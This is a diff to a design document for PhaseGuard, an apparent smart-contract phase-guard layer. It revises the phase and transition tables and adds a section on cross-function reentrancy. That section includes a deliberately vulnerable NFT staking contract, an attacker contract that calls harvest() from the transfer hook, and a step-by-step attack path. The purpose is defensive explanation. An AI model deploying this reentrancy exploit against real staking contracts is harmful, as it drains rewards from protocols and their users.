@@ -5,18 +5,16 @@ PhaseGuard is a lifecycle layer that routes every call through a shared phase ma
 
 ## Phase Descriptions
 
-| Phase          | Summary                                                                                  |
-|----------------|------------------------------------------------------------------------------------------|
-| Uninitialized  | Deployed but not initialized (initializer/init step pending).                            |
-| Ready          | Initialized, stable: user/admin entrypoints and reads allowed.                           |
-| Mutating       | Write phase: storage updates allowed, outbound calls/value blocked.                      |
-| Callbacking    | Transient hook window: inbound callbacks allowed, writes/external calls disabled.        |
-| Externalizing  | Outbound-call phase: external calls/value allowed per policy, storage writes blocked.    |
-| Finalized      | Terminal locked state: no transitions, writes, or calls.                                 |
-| Paused         | Temporary locked state: normal entrypoints blocked until admin moves to Ready/Finalized; reads per policy. |
-| Maintenance    | Admin-only maintenance/upgrade window: user entrypoints stay blocked while delegatecall/external automation runs under stricter policy bits. |
-
-- InCallback: inbound callbacks allowed, storage writes blocked
+| ID | Phase          | Type      | Summary                                                                                  |
+|----|----------------|-----------|------------------------------------------------------------------------------------------|
+| 0  | Uninitialized  | Unstable  | Not initialized (initializer/init step pending): must be initialized in the same tx as deployment. |
+| 1  | Ready          | Stable    | Initialized, stable: user/admin entrypoints and reads allowed.                           |
+| 2  | Mutating       | Unstable  | Write phase: storage updates allowed, outbound calls/value blocked.                      |
+| 3  | Callbacking    | Unstable  | Transient hook window: inbound callbacks allowed, writes/external calls disabled.        |
+| 4  | Externalizing  | Unstable  | Outbound-call phase: external calls/value allowed per policy, storage writes blocked.    |
+| 5  | Finalized      | Stable    | Terminal locked state: no transitions, writes, or calls.                                 |
+| 6  | Paused         | Stable    | Temporary locked state: normal entrypoints blocked until admin moves to Ready/Finalized; reads per policy. |
+| 7  | Maintenance    | Stable    | Admin-only maintenance/upgrade window: user entrypoints stay blocked while delegatecall/external automation runs under stricter policy bits. |
 
 ## Phase Transition Matrix
 
@@ -25,20 +23,29 @@ Allowed transitions:
 | From / To        | UNINITIALIZED | READY | MUTATING | CALLBACKING | EXTERNALIZING | FINALIZED | PAUSED | MAINTENANCE |
 |------------------|---------------|-------|----------|-------------|---------------|-----------|--------|-------------|
 | UNINITIALIZED    |      -        |  YES  |   NO     |     NO      |     NO        |   NO      |  NO    |     NO      |
-| READY            |     NO        |   -   |   YES    |     NO      |     YES       |   YES     |  YES   |     YES     |
-| MUTATING         |     NO        |  YES  |    -     |     YES     |     NO        |   NO      |  NO    |     YES     |
-| CALLBACKING      |     NO        |  NO   |   YES    |      -      |     NO        |   NO      |  NO    |     NO      |
-| EXTERNALIZING    |     NO        |  YES  |   NO     |     YES     |      -       |   NO      |  NO    |     YES     |
+| READY            |     NO        |   -   |   YES    |     NO      |     NO        |   YES     |  YES   |     YES     |
+| MUTATING         |     NO        |  YES⌃ |    -     |     NO      |     YES       |   NO      |  NO    |     YES⌃    |
+| CALLBACKING      |     NO        |  NO   |   NO     |      -      |     YES⌃      |   NO      |  NO    |     NO      |
+| EXTERNALIZING    |     NO        |  NO   |   YES⌃   |     YES     |      -        |   NO      |  NO    |     NO      |
 | FINALIZED        |     NO        |  NO   |   NO     |     NO      |     NO        |   -       |  NO    |     NO      |
 | PAUSED           |     NO        |  YES  |   NO     |     NO      |     NO        |   YES     |  -     |     YES     |
-| MAINTENANCE      |     NO        |  YES  |   YES    |     NO      |     YES       |   NO      |  NO    |      -      |
+| MAINTENANCE      |     NO        |  YES  |   YES    |     NO      |     NO        |   NO      |  NO    |      -      |
+
+⌃Allowed only during unwinding back to the stable phase
 
 **Stable phases:**
-- UNINITIALIZED, READY, FINALIZED, PAUSED, MAINTENANCE: contract **must** return to either of those after functions finish executing.
+- READY, FINALIZED, PAUSED, MAINTENANCE: contract **must** return to either of those after functions finish executing.
 
 **Unstable phases:**
+- UNINITIALIZED: contract is not allowed to remain uninitialized (atomic initialization). It **must** transition from UNINITIALIZED -> READY in the same tx originating from the deployer. If the transition to READY is not complete, the proxy becomes **bricked** as noone else is allowed to initialiaze it afterwards.
 - MUTATING, CALLBACKING, EXTERNALIZING: contract is allowed to be in unstable phases mid-function but **must** return to a stable phase when the call ends.
 - contract **must** return to the most recent stable phase captured on entry (eg., READY -> MUTATING -> CALLBACKING -> MUTATING -> READY).
+
+**Note on `READY` -> `EXTERNALIZING`** 
+- This transition is strictly forbidden to enforce safety. All functions performing external calls must first enter `MUTATING` to lock user entry (`ALLOW_USER = 0`), creating a mandatory mutex before any interaction occurs.
+
+**Note on `CALLBACKING`** 
+- This phase is only accessible from `EXTERNALIZING`. You cannot enter `CALLBACKING` directly from `MUTATING` because a callback implies a preceding external call.
 
 
 ## Bit Flag descriptions
@@ -298,7 +305,7 @@ Attack Path:
 | Security Challenge | Current Standard Solutions | PhaseGuard Solution |
 | :--- | :--- | :--- |
 | **Parity-style: Public initializer callable after redeploy** | Manual runbooks that remind operators to call `init` after deployment; relies entirely on humans | PhaseGuard keeps the contract in `UNINITIALIZED` until the privileged bootstrap script runs the initializer in the same transaction (or authorized sequence): every other entrypoint—including `init` reverts |
-| **Nomad-style: Critical state defaults because initializer never runs** | Audits and post-deploy checklists to set state (e.g., Merkle roots) | PhaseGuard blocks every public function while in `UNINITIALIZED`, so operational calls like `process()` cannot execute until the initializer commits non-zero state. If the bootstrap deadline is missed, deployment reverts |
+| **Nomad-style: Critical state defaults because initializer never runs** | Audits and post-deploy checklists to set state (e.g., Merkle roots) | PhaseGuard blocks every public function while in `UNINITIALIZED`. If the atomic bootstrap sequence is not completed in the deployment transaction, the contract becomes **bricked** (permanently locked in `UNINITIALIZED` with no valid entrypoints), preventing the usage of a contract with zeroed state. |
 
 ## 5. Pause bypass / incomplete pause coverage
 
@@ -563,6 +570,98 @@ Attack path:
 
 | Security Challenge | Current Standard Solutions | PhaseGuard Solution |
 | :--- | :--- | :--- |
-| **Callback exploit in delegatecalled proxy** | Ban ERC777-style tokens, add `nonReentrant` modifiers, or use custom lock flags inside each hook | The guard blocks writes while externalizing, only enables callbacks inside a Callbacking phase with ALLOW_WRITES and ALLOW_EXTERNAL disabled, and forces execution to unwind back to the stable phase recorded on entry, so hooks can’t mutate stale state or loop outbound calls|
+| **Callback exploit in delegatecalled proxy** | Ban ERC777-style tokens, add `nonReentrant` modifiers, or use custom lock flags inside each hook | The guard blocks writes while externalizing, only enables callbacks inside a Callbacking phase with ALLOW_WRITES and ALLOW_EXTERNAL disabled, and forces execution to return back to the stable phase recorded on entry, so hooks can’t mutate stale state or loop outbound calls|
 
+## 8. Cross-Function State Bleeding (Per-ID)
 
+A logic inconsistency between two different functions that operate on the same ID. While technically a reentrancy bug, it is distinct because it exploits the gap between two *different* entrypoints rather than re-entering the caller.
+
+|  | Description |
+|-----------|-------------|
+| **Victim** | NFT Staking / Position Managers |
+| **Trigger** | `safeTransfer` callback during exit |
+| **Result** | Rewards claimed on already-withdrawn assets |
+| **Attack** | `unstake(id)` triggers hook -> `harvest(id)` reads stale state |
+
+**Example: NFT Staking "Cleanup" vulnerability**
+
+*Mechanism: The protocol follows a "Check -> Interact -> Cleanup" flow. The cleanup (deletion of stake data) happens last, allowing a cross-function re-entry.*
+
+```solidity
+contract NftStaker {
+    struct Stake { 
+        uint256 timestamp; 
+        address owner; 
+    }
+    mapping(uint256 => Stake) public stakes;
+    IERC721 public nft;
+    IERC20 public rewardToken;
+
+    // Function A: Exit the system
+    function unstake(uint256 tokenId) external {
+        require(stakes[tokenId].owner == msg.sender, "not owner");
+
+        // 1. Interaction: Return the NFT
+        // Vulnerability: safeTransferFrom triggers onERC721Received on recipient
+        nft.safeTransferFrom(address(this), msg.sender, tokenId);
+
+        // 2. Effect: Cleanup storage
+        // Developer places this last to zero out the struct (gas refund pattern)
+        delete stakes[tokenId];
+    }
+
+    // Function B: Claim rewards (Publicly callable)
+    function harvest(uint256 tokenId) external {
+        Stake memory s = stakes[tokenId];
+        
+        // Vulnerability logic:
+        // If called mid-unstake, 's.owner' is still set because 'delete' hasn't run.
+        require(s.owner == msg.sender, "not owner");
+        
+        uint256 rewards = (block.timestamp - s.timestamp) * 1e18; 
+        
+        // Updates timestamp to now (benign, since struct is about to be deleted)
+        stakes[tokenId].timestamp = block.timestamp; 
+        
+        // Transfers rewards for an NFT the user effectively just withdrew
+        rewardToken.transfer(s.owner, rewards);
+    }
+}
+
+// Attacker Contract
+contract CrossFunctionExploiter is IERC721Receiver {
+    NftStaker public staker;
+    uint256 public activeId;
+
+    function attack(uint256 tokenId) external {
+        activeId = tokenId;
+        // Start the exit process
+        staker.unstake(tokenId);
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external override returns (bytes4) {
+        // Callback fires mid-unstake.
+        // The NFT is already in our wallet (step 1 complete).
+        // But 'stakes[tokenId]' hasn't been deleted yet (step 2 pending).
+        
+        // We call harvest() to claim rewards on the NFT we just withdrew.
+        staker.harvest(activeId);
+        
+        return this.onERC721Received.selector;
+    }
+}
+```
+
+**Attack Path:**
+1. Attacker calls `unstake(ID)`.
+2. Contract sends NFT to Attacker (`safeTransferFrom`).
+3. Attacker's receiver hook fires and calls `harvest(ID)`.
+4. `harvest` checks storage: `stakes[ID]` still exists because `unstake` hasn't reached the `delete` line yet.
+5. `harvest` pays out rewards.
+6. `harvest` finishes.
+7. `unstake` resumes and finally executes `delete stakes[ID]`.
+8. **Result:** Attacker leaves with both the NFT and the rewards, exploiting the stale state window.
+
+| Security Challenge | Current Standard Solutions | PhaseGuard Solution |
+| :--- | :--- | :--- |
+| **Cross-Function Interaction** | `nonReentrant` modifiers on ALL public functions interacting with state (easy to miss helper functions) or strict adherence to CEI (Move `delete` before `transfer`). | **Automatic Lifecycle Stack** <br> The logic inside PhaseGuard treats the contract lifecycle as a stack. <br> **Flow:** `READY` → `MUTATING` (Lock) → `EXTERNALIZING` (Transfer) → `MUTATING` (Cleanup) → `READY`. <br> Even though the transfer happens before the deletion, the contract returns is in `EXTERNALIZING` during the external call: `ALLOW_USER` remains disabled protecting the specific state gap. |
